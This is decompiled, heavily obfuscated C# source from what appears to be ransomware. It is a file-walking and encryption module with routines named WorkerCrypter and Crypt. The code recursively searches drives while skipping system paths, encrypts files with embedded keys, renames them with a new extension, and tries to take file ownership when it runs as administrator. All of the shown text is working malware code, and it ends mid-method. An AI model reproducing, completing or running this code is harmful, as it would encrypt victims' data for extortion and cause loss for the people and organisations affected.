using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using HxobVrDuhJbMYt;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using lKwIARJqZgRWh;

namespace PMpBbYpvEb;

internal sealed class PhxOPeBqRsG
{
	public sealed class DjVwlfeBamsiYSvc
	{
		private static StringCollection jGWJuhqawQzg;

		private static List<string> vXGGPhHOkFKYsuXO;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107412746));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains(getString_0(107412741)) && !text.ToLower().Contains(getString_0(107412752)) && !text.ToLower().Contains(getString_0(107388234)) && !text.ToLower().Contains(getString_0(107388253)) && !text.ToLower().Contains(getString_0(107412707)) && !text.ToLower().Contains(getString_0(107388073)) && !text.ToLower().Contains(getString_0(107388485)) && !text.ToLower().Contains(getString_0(107388500)) && !text.ToLower().Contains(getString_0(107388451)) && !text.ToLower().Contains(getString_0(107388466)) && !text.ToLower().Contains(getString_0(107388432)) && !text.ToLower().Contains(getString_0(107388383)) && !text.ToLower().Contains(getString_0(107388398)) && !text.ToLower().Contains(getString_0(107388353)) && !text.ToLower().Contains(getString_0(107388332)) && !text.ToLower().Contains(getString_0(107388319)) && !text.ToLower().Contains(getString_0(107388338)) && !text.ToLower().Contains(getString_0(107388289)) && !text.ToLower().Contains(getString_0(107388304)) && !text.Contains(jPRGqhYdKzNWs(getString_0(107387743))) && !text.Contains(getString_0(107387718)) && !text.Contains(getString_0(107387737)) && !text.Contains(getString_0(107387692)) && !text.EndsWith(getString_0(107394932)) && !text.EndsWith(getString_0(107387699)) && !text.EndsWith(getString_0(107387694)) && !text.EndsWith(getString_0(107387657)) && !text.EndsWith(getString_0(107387652)) && !text.ToLower().Contains(getString_0(107387647)) && !text.ToLower().Contains(yVwPEJFmibAZK)) || text.Contains(jPRGqhYdKzNWs(getString_0(107388046))))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(hlKQtNLDuwX) * 1024.0 * 1024.0 && nLzLTpABeRNVVq == getString_0(107396824))
							{
								vXGGPhHOkFKYsuXO.Add(text);
							}
							else if (File.Exists(text) && nLzLTpABeRNVVq == getString_0(107396623))
							{
								vXGGPhHOkFKYsuXO.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return vXGGPhHOkFKYsuXO;
		}

		static DjVwlfeBamsiYSvc()
		{
			Strings.CreateGetStringDelegate(typeof(DjVwlfeBamsiYSvc));
			jGWJuhqawQzg = new StringCollection();
			vXGGPhHOkFKYsuXO = new List<string>();
		}
	}

	private sealed class wBzlthIsHYq
	{
		public string JmhoIVQmAhECyC;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == JmhoIVQmAhECyC;
		}
	}

	private sealed class oaYjaKaLoddVokp
	{
		public string HOXtxRZFdpFkl;

		public bool _003CIsDriveNTFS_003Eb__1d(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == HOXtxRZFdpFkl;
		}
	}

	private sealed class HykHslIzmdKZ
	{
		private sealed class sPVQoTuZMci
		{
			public HykHslIzmdKZ SbDXswzrOAQ;

			public string GJyXvyLrqMMaV;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ovhYHjFmAq(WindowsIdentity.GetCurrent().Name, GJyXvyLrqMMaV);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				dPlSeQmOkALFpI(GJyXvyLrqMMaV, SbDXswzrOAQ.glMvqygTgUhb, SbDXswzrOAQ.BcCdGjAQGzfmNTOF, SbDXswzrOAQ.JffjCWlmlrkAOw, SbDXswzrOAQ.WemmvPavSpAyEt);
			}
		}

		public string[] glMvqygTgUhb;

		public string[] JffjCWlmlrkAOw;

		public string WemmvPavSpAyEt;

		public string BcCdGjAQGzfmNTOF;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			sPVQoTuZMci CS_0024_003C_003E8__locals0 = new sPVQoTuZMci();
			CS_0024_003C_003E8__locals0.SbDXswzrOAQ = this;
			CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV = string_0;
			if (AfVRFSOzqdcuiaP && !hhcgraCrPsmCioL().Contains(getString_0(107389028)) && !hhcgraCrPsmCioL().Contains(getString_0(107386597)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ovhYHjFmAq(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (xkNXdReJgqdr == getString_0(107396831))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					dPlSeQmOkALFpI(CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.glMvqygTgUhb, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.BcCdGjAQGzfmNTOF, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.JffjCWlmlrkAOw, CS_0024_003C_003E8__locals0.SbDXswzrOAQ.WemmvPavSpAyEt);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				dPlSeQmOkALFpI(CS_0024_003C_003E8__locals0.GJyXvyLrqMMaV, glMvqygTgUhb, BcCdGjAQGzfmNTOF, JffjCWlmlrkAOw, WemmvPavSpAyEt);
			}
		}

		static HykHslIzmdKZ()
		{
			Strings.CreateGetStringDelegate(typeof(HykHslIzmdKZ));
		}
	}

	private sealed class UMXNmMotuFVr
	{
		private sealed class hliwGyoemnnVs
		{
			public UMXNmMotuFVr hdfjPBCWXrpm;

			public string dRnSJbMHcOFBx;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				try
				{
					if (oGWxQvtPLxTata)
					{
						Console.WriteLine(getString_0(107412254) + dRnSJbMHcOFBx + getString_0(107412663) + new FileInfo(dRnSJbMHcOFBx).Length + getString_0(107412674));
						Console.WriteLine(getString_0(107412261), rIFldVBsKLex.Count, AOxElPxfgdJ, jlTbuRFtzeuGOi);
						Console.WriteLine(getString_0(107412204), pgcRoGyexW.Elapsed);
						Console.WriteLine(getString_0(107412633));
					}
				}
				catch
				{
				}
			}

			static hliwGyoemnnVs()
			{
				Strings.CreateGetStringDelegate(typeof(hliwGyoemnnVs));
			}
		}

		private sealed class rThcNdsXcoIrpl
		{
			public hliwGyoemnnVs LiNWpmUJbvSgWiel;

			public UMXNmMotuFVr hdfjPBCWXrpm;

			public string uCzITAhJCoW;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
				{
					if (uCzITAhJCoW.ToLower().EndsWith(wMwztsmasQzPlm + hdfjPBCWXrpm.lnskrEIqNRqxPQs) && NuNXfGMelkyJH == getString_0(107396846))
					{
						if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > new FileInfo(uCzITAhJCoW).Length)
						{
							try
							{
								tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389130), getString_0(107389125), getString_0(107389080), uCzITAhJCoW);
							}
							catch
							{
							}
						}
					}
					else if (uCzITAhJCoW.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396645))
					{
						try
						{
							tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389130), getString_0(107389125), getString_0(107389080), uCzITAhJCoW);
						}
						catch
						{
						}
					}
				}
			}

			static rThcNdsXcoIrpl()
			{
				Strings.CreateGetStringDelegate(typeof(rThcNdsXcoIrpl));
			}
		}

		private sealed class IotoyMkpqvvqDZe
		{
			public UMXNmMotuFVr hdfjPBCWXrpm;

			public string dRnSJbMHcOFBx;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__3a()
			{
				try
				{
					if (oGWxQvtPLxTata)
					{
						Console.WriteLine(getString_0(107412261) + dRnSJbMHcOFBx + getString_0(107412670) + new FileInfo(dRnSJbMHcOFBx).Length + getString_0(107412681));
						Console.WriteLine(getString_0(107412268), rIFldVBsKLex.Count, AOxElPxfgdJ, jlTbuRFtzeuGOi);
						Console.WriteLine(getString_0(107412211), pgcRoGyexW.Elapsed);
						Console.WriteLine(getString_0(107412640));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__3b()
			{
				foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
				{
					if (dRnSJbMHcOFBx.ToLower().EndsWith(wMwztsmasQzPlm + hdfjPBCWXrpm.lnskrEIqNRqxPQs) && NuNXfGMelkyJH == getString_0(107396849))
					{
						if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > new FileInfo(dRnSJbMHcOFBx).Length)
						{
							try
							{
								tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389133), getString_0(107389128), getString_0(107389083), dRnSJbMHcOFBx);
							}
							catch
							{
							}
						}
					}
					else if (dRnSJbMHcOFBx.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396648))
					{
						try
						{
							tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389133), getString_0(107389128), getString_0(107389083), dRnSJbMHcOFBx);
						}
						catch
						{
						}
					}
				}
			}

			static IotoyMkpqvvqDZe()
			{
				Strings.CreateGetStringDelegate(typeof(IotoyMkpqvvqDZe));
			}
		}

		public List<string> wmSlFLUQMYk;

		public List<string> MRBsiJVrGpV;

		public string lnskrEIqNRqxPQs;

		public string[] rzGfvbLcdyGbE;

		public string NsSmeXJHTmoYqwKN;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			using List<string>.Enumerator enumerator = MRBsiJVrGpV.GetEnumerator();
			rThcNdsXcoIrpl CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				hliwGyoemnnVs CS_0024_003C_003E8__locals1 = new hliwGyoemnnVs();
				CS_0024_003C_003E8__locals1.hdfjPBCWXrpm = this;
				CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx = enumerator.Current;
				if (((CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388868)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388843)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388298)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388249)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388268)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388211)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388222)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388177)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388196)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388159)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388118)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388133)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388107)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388054))) && !CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(getString_0(107388061)))) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388500)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388515)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388466)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388481)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388432)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388447)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388398)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388413)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388368)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107388347)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388334)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388353)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388304)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388319)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(getString_0(107387758))) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107387733)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107387752)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107396287)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107387707)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(lnskrEIqNRqxPQs) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(getString_0(107387714)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(getString_0(107387709)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(getString_0(107387672)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(getString_0(107387667)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(getString_0(107387662)) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(yVwPEJFmibAZK) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(CJWDXdtMlfSYp) || CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.Contains(VLIXjNPLrckApD))
				{
					continue;
				}
				if (rzGfvbLcdyGbE.Length != 0)
				{
					string[] array = rzGfvbLcdyGbE;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_10d8;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(lnskrEIqNRqxPQs))
					{
						goto IL_10d8;
					}
				}
				catch (Exception)
				{
					goto IL_10d8;
				}
				if (!CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx.EndsWith(string_0) || rIFldVBsKLex.Contains(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx))
				{
					continue;
				}
				if (KBtpeelEiWZuxq == getString_0(107396839))
				{
					try
					{
						if (LQFJNYySgreoXH.ZXqazdzrWuEoK(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx))
						{
							LQFJNYySgreoXH.JDPsRwBlMXAQgL(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
						}
					}
					catch
					{
					}
				}
				rIFldVBsKLex.Add(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (oGWxQvtPLxTata)
						{
							Console.WriteLine(hliwGyoemnnVs.getString_0(107412254) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + hliwGyoemnnVs.getString_0(107412663) + new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length + hliwGyoemnnVs.getString_0(107412674));
							Console.WriteLine(hliwGyoemnnVs.getString_0(107412261), rIFldVBsKLex.Count, AOxElPxfgdJ, jlTbuRFtzeuGOi);
							Console.WriteLine(hliwGyoemnnVs.getString_0(107412204), pgcRoGyexW.Elapsed);
							Console.WriteLine(hliwGyoemnnVs.getString_0(107412633));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!tCYvoiODTAqS.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx)))
				{
					tCYvoiODTAqS.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx));
				}
				HoylbjiqYR(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
				try
				{
					new RJcskyZFMlSio().FmxkExlpiaLUbQn(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (oGWxQvtPLxTata)
							{
								Console.WriteLine(getString_0(107412737) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107412660) + new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length + getString_0(107412671));
								Console.WriteLine(getString_0(107412630));
							}
						}
						catch
						{
						}
						cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107413037)), getString_0(107387578) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107387578) + jPRGqhYdKzNWs(getString_0(107413012)) + getString_0(107387578) + Environment.UserName + getString_0(107387578) + jPRGqhYdKzNWs(getString_0(107413027)));
					}
				}
				catch (Exception ex2)
				{
					if (iJiZVjbYIelgdjs)
					{
						try
						{
							File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107413002) + ex2.Message + getString_0(107395734));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (iJiZVjbYIelgdjs)
						{
							try
							{
								File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107412889) + ex2.Message + getString_0(107395734));
							}
							catch (Exception)
							{
							}
						}
						jlTbuRFtzeuGOi++;
						goto end_IL_08d1;
					}
					byte[] bytes;
					if (tRxOjxLQIVi == getString_0(107396839) && new FileInfo(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx).Length > Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024 && !wmSlFLUQMYk.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new rThcNdsXcoIrpl();
						CS_0024_003C_003E8__locals0.LiNWpmUJbvSgWiel = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.hdfjPBCWXrpm = this;
						try
						{
							if (lnskrEIqNRqxPQs != getString_0(107386583))
							{
								if (mVHEjGEVbs)
								{
									lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + lnskrEIqNRqxPQs;
								}
								File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs);
							}
						}
						catch (Exception ex2)
						{
							if (iJiZVjbYIelgdjs)
							{
								try
								{
									File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107412316) + ex2.Message + getString_0(107395734));
								}
								catch (Exception)
								{
								}
							}
							jlTbuRFtzeuGOi++;
							goto end_IL_08d1;
						}
						CS_0024_003C_003E8__locals0.uCzITAhJCoW = getString_0(107389522);
						if (lnskrEIqNRqxPQs != getString_0(107386583))
						{
							CS_0024_003C_003E8__locals0.uCzITAhJCoW = CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs;
						}
						else
						{
							CS_0024_003C_003E8__locals0.uCzITAhJCoW = CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx;
						}
						if (hCeAnCNkuBouGp == getString_0(107396839))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
								{
									if (CS_0024_003C_003E8__locals0.uCzITAhJCoW.ToLower().EndsWith(wMwztsmasQzPlm + CS_0024_003C_003E8__locals0.hdfjPBCWXrpm.lnskrEIqNRqxPQs) && NuNXfGMelkyJH == rThcNdsXcoIrpl.getString_0(107396846))
									{
										if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.uCzITAhJCoW).Length)
										{
											try
											{
												tHlEcNRvGaVVN.LwYCJufplFzw(rThcNdsXcoIrpl.getString_0(107389130), rThcNdsXcoIrpl.getString_0(107389125), rThcNdsXcoIrpl.getString_0(107389080), CS_0024_003C_003E8__locals0.uCzITAhJCoW);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.uCzITAhJCoW.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == rThcNdsXcoIrpl.getString_0(107396645))
									{
										try
										{
											tHlEcNRvGaVVN.LwYCJufplFzw(rThcNdsXcoIrpl.getString_0(107389130), rThcNdsXcoIrpl.getString_0(107389125), rThcNdsXcoIrpl.getString_0(107389080), CS_0024_003C_003E8__locals0.uCzITAhJCoW);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						bytes = Encoding.ASCII.GetBytes(lYLvwKXVot);
						if (msoqVvcNnNic == getString_0(107396638))
						{
							byte[] array2 = null;
							byte[] byte_ = ILCPTbEyPImvS.hUdUxAsVxYJrsJYB(CS_0024_003C_003E8__locals0.uCzITAhJCoW, Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024);
							if (ILCPTbEyPImvS.trQfhmTmPgoc(opGohBOiRlt: (!XCsezoZWotlJ) ? (ldSVapxVzrqD ? ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ldSVapxVzrqD ? xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn)) : xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn))), eVaQLrRtqDcN: CS_0024_003C_003E8__locals0.uCzITAhJCoW, aiPzWzsMyTl: bytes))
							{
								goto IL_10d8;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
							}
							catch (Exception)
							{
							}
						}
						else if (!ldSVapxVzrqD)
						{
							if (fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.uCzITAhJCoW, BDeugxVDNkK, NsSmeXJHTmoYqwKN, null, Convert.FromBase64String(ndmvemzTqn)))
							{
								goto IL_10d8;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.uCzITAhJCoW, BDeugxVDNkK, NsSmeXJHTmoYqwKN, bytes, Convert.FromBase64String(ndmvemzTqn)))
							{
								goto IL_10d8;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (mVHEjGEVbs)
					{
						lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + lnskrEIqNRqxPQs;
					}
					bytes = Encoding.ASCII.GetBytes(lYLvwKXVot);
					if (lnskrEIqNRqxPQs != getString_0(107386583))
					{
						if (!AtuUAtLJmhINGx)
						{
							if (!ldSVapxVzrqD)
							{
								gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, QbfcPqWZFoPC);
							}
							else
							{
								gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, Convert.FromBase64String(NsSmeXJHTmoYqwKN));
							}
						}
						else
						{
							try
							{
								if (!ldSVapxVzrqD)
								{
									PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
								}
								else
								{
									PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
								}
							}
							catch (Exception ex2)
							{
								if (iJiZVjbYIelgdjs)
								{
									try
									{
										File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107386601) + ex2.Message + getString_0(107395734));
									}
									catch (Exception)
									{
									}
								}
								jlTbuRFtzeuGOi++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
								}
								catch (Exception)
								{
								}
								goto end_IL_08d1;
							}
						}
					}
					else if (!AtuUAtLJmhINGx)
					{
						if (!ldSVapxVzrqD)
						{
							gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107386578), QbfcPqWZFoPC);
						}
						else
						{
							gGrpQJiClzFyZ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107386578), Convert.FromBase64String(NsSmeXJHTmoYqwKN));
						}
					}
					else
					{
						try
						{
							if (!ldSVapxVzrqD)
							{
								PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
							}
							else
							{
								PSWanipCZcsCQ(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
							}
						}
						catch (Exception ex2)
						{
							if (iJiZVjbYIelgdjs)
							{
								try
								{
									File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + getString_0(107386601) + ex2.Message + getString_0(107395734));
								}
								catch (Exception)
								{
								}
							}
							jlTbuRFtzeuGOi++;
							goto end_IL_08d1;
						}
					}
					if (ldSVapxVzrqD)
					{
						if (lnskrEIqNRqxPQs != getString_0(107386583))
						{
							PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, bytes);
						}
						else
						{
							PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx, bytes);
						}
					}
					goto IL_10d8;
					end_IL_08d1:;
				}
				catch (Exception)
				{
					goto IL_10d8;
				}
				continue;
				IL_10d8:
				MRBsiJVrGpV.Remove(CS_0024_003C_003E8__locals1.dRnSJbMHcOFBx);
			}
		}

		public void _003CWorkerCrypter2_003Eb__39(string string_0)
		{
